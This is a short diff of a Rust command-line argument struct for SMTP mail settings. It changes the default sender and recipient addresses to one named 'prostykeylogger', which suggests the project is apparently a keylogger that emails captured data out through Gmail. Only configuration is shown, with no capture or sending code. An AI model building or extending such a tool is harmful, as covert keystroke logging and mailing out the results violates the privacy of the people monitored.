@@ -12,10 +12,10 @@ pub struct Args{
     #[arg(short = 'p', long="password", help = "SMTP password")]
     pub smtp_password: String,
 
-    #[arg(short = 'f', long="from", help = "Mail address from", default_value = "<serwerinstancja@gmail.com>" )]
+    #[arg(short = 'f', long="from", help = "Mail address from", default_value = "<prostykeylogger@gmail.com>" )]
     pub mail_from: String,
 
-    #[arg(short = 't', long="to", help = "Mail address to", default_value = "Admin <serwerinstancja@gmail.com>")]
+    #[arg(short = 't', long="to", help = "Mail address to", default_value = "Admin <prostykeylogger@gmail.com>")]
     pub mail_to: String,
 
     #[arg(short = 'r', long="relay", help = "Mail server relay", default_value = "smtp.gmail.com")]
